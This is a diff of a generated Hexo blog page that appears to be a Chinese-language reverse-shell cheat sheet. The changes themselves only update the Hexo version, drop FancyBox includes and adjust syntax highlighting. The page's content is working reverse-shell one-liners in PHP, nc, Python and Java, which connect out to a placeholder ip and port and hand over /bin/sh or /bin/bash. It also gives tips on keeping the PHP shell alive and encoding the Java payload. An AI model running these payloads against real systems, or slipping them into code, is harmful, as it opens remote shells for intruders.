@@ -49,10 +49,7 @@
     
 	<!-- mathjax -->
 	
-	
-      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
-    
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -162,7 +159,7 @@
 <p>以上这种方法可能在一定情况下存在反弹一下就断掉的情况，主要原因是：执行如上代码的话，会把系统的标准输入输出重定向到/bin/sh里，导致php-fpm直接502，然后弹的shell也会瞬间掉了，所以可以采用以下命令进行反弹shell</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock = fsockopen(&quot;ip&quot;, port);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process = proc_open(&quot;/bin/sh&quot;, $descriptorspec, $pipes);proc_close($process);&#x27;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=fsockopen(<span class="string">&quot;ip&quot;</span>, port);exec(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;ip&quot;</span>, port);<span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash [ip] [port]</span><br></pre></td></tr></table></figure>
 
@@ -174,7 +171,7 @@
 
 <h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
 
-<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
 
 <p>通常”/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”进行<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码</a>后使用</p>
 
@@ -320,10 +317,6 @@
 <!-- Umami Analytics -->
 
 <!-- Disqus Comments -->
-
-<!-- FancyBox -->
-
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
 
 </body>
 </html>
